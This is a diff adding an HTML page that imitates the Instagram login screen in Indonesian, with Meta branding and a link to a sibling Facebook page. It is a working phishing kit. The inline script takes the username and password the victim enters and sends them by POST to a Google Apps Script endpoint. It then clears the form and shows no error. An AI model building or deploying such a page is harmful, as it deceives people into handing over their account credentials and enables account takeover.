@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <title>Instagram</title>
+    <link rel="stylesheet" href="style.css" type="text/css" media="all" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" type="text/css" media="all" />
+  </head>
+  <body>
+    <p class="bhs text-center mb-5 mt-3">Bahasa Indonesia</p>
+    <div class="text-center mb-5">
+     <img src="logo.png" alt="logo" />
+    </div>
+    <div class="loginfb text-center">
+      <a href="../facebook/" class="loka"><button name="logfb" id="logfb">Lanjutkan Dengan Facebook</a></button>
+    </div>
+    <div class="atau text-center mt-4 mb-4">
+      <p>ATAU</p>
+    </div>
+    <div class="loginn text-center">
+      <table border="0" align="center">
+        <tr>
+          <td>
+            <form name="iglogin">
+      <input type="text" name="username" id="username" placeholder="Nomer Telepon, nama pengguna, atau email"/>
+      </td>
+      </tr>
+      <tr>
+        <td>
+      <input type="password" name="pw" id="pw" placeholder="Kata Sandi" />
+      </td>
+      </tr>
+        <tr>
+          <td><p class="lupasndi mt-2 mb-4">Lupa Kata Sandi?</p></td>
+        </tr>
+        <tr>
+          <td>
+            <input type="submit" name="Loginig" id="Loginig" value="Login" class="mt-0"/>
+          </td>
+        </tr>
+      </table>
+    </div>
+    <div class="tdkpnyaakun text-center mt-4">
+      <p class="tdkakun">Tidak Punya Akun? <a href="#" class="tdkpnyaakun">Buat Akun</a></p>
+    </div>
+    <div class="metaa text-center mt-5 mb-2">
+      <p class="mb-0">From</p>
+      <img src="meta.png" alt="meta" class="metag mt-1"/>
+    </div>
+    <script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbzkavtkEY800UCwSKKreL1RMwOe4yPWN9YYc8MZ0-nsRF-MIju0gqLOgAKnd1zREZi6Iw/exec'
+  const form = document.forms['iglogin']
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then((response) => {
+        form.reset();
+        console.log('Success!', response);
+      })
+      .catch(error => console.error('Error!', error.message))
+  })
+</script>
+  </body>
+</html>
